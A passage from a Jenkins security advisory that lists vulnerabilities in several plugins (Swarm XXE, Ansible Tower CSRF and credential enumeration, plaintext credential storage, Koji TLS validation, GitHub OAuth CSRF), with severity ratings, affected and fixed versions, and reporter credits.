[Medium](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:A/AC:L/PR:N/UI:N/S:C/C:L/I:N/A:L)

**Affected plugin:
[`swarm`](https://plugins.jenkins.io/swarm)**

**Description:**

Swarm Plugin allows clients to auto-discover Jenkins instances on the same network through a UDP discovery request.
Responses to this request are XML documents.

Swarm Plugin does not configure the XML parser in a way that would prevent XML External Entity (XXE) processing.
This allows unauthenticated attackers on the same network to have Swarm clients parse a maliciously crafted XML response that uses external entities to read arbitrary files from the Swarm client or denial-of-service attacks.

As of publication of this advisory, there is no fix.

### CSRF vulnerability and missing permission check in Ansible Tower Plugin allowed capturing credentials

**SECURITY-1355 (1)
/
CVE-2019-10310 (CSRF) and CVE-2019-10311 (permission check)**

**Severity (CVSS):**
[Medium](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:N)

**Affected plugin:
[`ansible-tower`](https://plugins.jenkins.io/ansible-tower)**

**Description:**

Ansible Tower Plugin did not perform permission checks on a method implementing form validation.
This allowed users with Overall/Read access to Jenkins to connect to an attacker-specified URL using attacker-specified credentials IDs obtained through another method, capturing credentials stored in Jenkins.

Additionally, this form validation method did not require POST requests, resulting in a cross-site request forgery vulnerability.

This form validation method now requires POST requests and Overall/Administer permissions.

### Users with Overall/Read access are able to enumerate credential IDs in Ansible Tower Plugin

**SECURITY-1355 (2)
/
CVE-2019-10312**

**Severity (CVSS):**
[Medium](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N)

**Affected plugin:
[`ansible-tower`](https://plugins.jenkins.io/ansible-tower)**

**Description:**

Ansible Tower Plugin provides a list of applicable credential IDs to allow users configuring the plugin to select the one to use.

This functionality did not check permissions, allowing any user with Overall/Read permission to get a list of valid credentials IDs.
Those could be used as part of an attack to capture the credentials using another vulnerability.

An enumeration of credentials IDs in this plugin now requires Overall/Administer permission.

### Microsoft Entra ID (previously Azure AD) Plugin stored credentials in plain text

**SECURITY-1390
/
CVE-2019-10318**

**Severity (CVSS):**
[Low](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N)

**Affected plugin:
[`azure-ad`](https://plugins.jenkins.io/azure-ad)**

**Description:**

Microsoft Entra ID (previously Azure AD) Plugin stored the client secret unencrypted in the global `config.xml` configuration file on the Jenkins controller.
These credentials could be viewed by users with access to the Jenkins controller file system.

Microsoft Entra ID (previously Azure AD) Plugin now stores the client secret encrypted.

### Twitter Plugin stores credentials in plain text

**SECURITY-1143
/
CVE-2019-10313**

**Severity (CVSS):**
[Low](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N)

**Affected plugin:
[`twitter`](https://plugins.jenkins.io/twitter)**

**Description:**

Twitter Plugin stores credentials unencrypted in its global configuration file on the Jenkins controller.
These credentials could be viewed by users with access to the Jenkins controller file system.

As of publication of this advisory, there is no fix.

### Koji Plugin globally and unconditionally disables SSL/TLS certificate validation

**SECURITY-936
/
CVE-2019-10314**

**Severity (CVSS):**
[Medium](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:L/A:N)

**Affected plugin:
[`koji`](https://plugins.jenkins.io/koji)**

**Description:**

Koji Plugin unconditionally disables SSL/TLS certificate validation for the entire Jenkins controller JVM.

As of publication of this advisory, there is no fix.

### CSRF vulnerability in OAuth callback in GitHub Authentication Plugin

**SECURITY-443
/
CVE-2019-10315**

**Severity (CVSS):**
[Medium](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:L)

**Affected plugin:
[`github-oauth`](https://plugins.jenkins.io/github-oauth)**

**Description:**

GitHub Authentication Plugin did not manage the state parameter of OAuth to prevent CSRF.
This allowed an attacker to catch the redirect URL provided during the authentication process using OAuth and send it to the victim.
If the victim was already connected to Jenkins, their Jenkins account would be attached to the attacker’s GitHub account.

The state parameter is now correctly managed.

### Aqua MicroScanner Plugin stored credentials in plain text

**SECURITY-1380
/
CVE-2019-10316**

**Severity (CVSS):**
[Low](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N)

**Affected plugin:
[`aqua-microscanner`](https://plugins.jenkins.io/aqua-microscanner)**

**Description:**

Aqua MicroScanner Plugin stored credentials unencrypted in its global configuration file on the Jenkins controller.
These credentials could be viewed by users with access to the Jenkins controller file system.

Aqua MicroScanner Plugin now stores credentials encrypted.

## Severity

* SECURITY-443:
  [Medium](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:L)
* SECURITY-930:
  [Medium](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:L/A:N)
* SECURITY-936:
  [Medium](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:L/A:N)
* SECURITY-1100:
  [Medium](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N)
* SECURITY-1143:
  [Low](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N)
* SECURITY-1252:
  [Medium](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:A/AC:L/PR:N/UI:N/S:C/C:L/I:N/A:L)
* SECURITY-1355 (1):
  [Medium](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:N)
* SECURITY-1355 (2):
  [Medium](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N)
* SECURITY-1380:
  [Low](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N)
* SECURITY-1390:
  [Low](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N)

## Affected Versions

* **analysis-core
  Plugin**
  up to and including
  1.95
* **Ansible Tower
  Plugin**
  up to and including
  0.9.1
* **Aqua MicroScanner
  Plugin**
  up to and including
  1.0.5
* **GitHub Authentication
  Plugin**
  up to and including
  0.31
* **Koji
  Plugin**
  up to and including
  0.3
* **Microsoft Entra ID (previously Azure AD)
  Plugin**
  up to and including
  0.3.3
* **SiteMonitor
  Plugin**
  up to and including
  0.5
* **Swarm
  Plugin**
  up to and including
  3.15
* **Twitter
  Plugin**
  up to and including
  0.7

## Fix

* **analysis-core
  Plugin**
  should be updated to version
  1.96
* **Ansible Tower
  Plugin**
  should be updated to version
  0.9.2
* **Aqua MicroScanner
  Plugin**
  should be updated to version
  1.0.6
* **GitHub Authentication
  Plugin**
  should be updated to version
  0.32
* **Microsoft Entra ID (previously Azure AD)
  Plugin**
  should be updated to version
  0.3.4
* **SiteMonitor
  Plugin**
  should be updated to version
  0.6

These versions include fixes to the vulnerabilities described above. All prior versions are considered to be affected by these vulnerabilities unless otherwise indicated.

As of publication of this advisory, no fixes are available for the following plugins:

* Koji
  Plugin
* Swarm
  Plugin
* Twitter
  Plugin

[Learn why we announce these issues.](/security/plugins/#unresolved)

## Credit

The Jenkins project would like to thank the reporters for discovering and
[reporting](/security/#reporting-vulnerabilities)
these vulnerabilities:

* **Daniel Beck, CloudBees, Inc.**
  for
  SECURITY-930, SECURITY-936
* **Mark Combellack, CafeX Communications**
  for
  SECURITY-1390
* **Oleg Nenashev, CloudBees, Inc.**
  for
  SECURITY-1100
* **Peter Adkins of Cisco Umbrella**
  for
  SECURITY-1252, SECURITY-1355 (1), SECURITY-1355 (2)
* **Takashi Suzuki(@taka\_1690)**
  for
  SECURITY-443


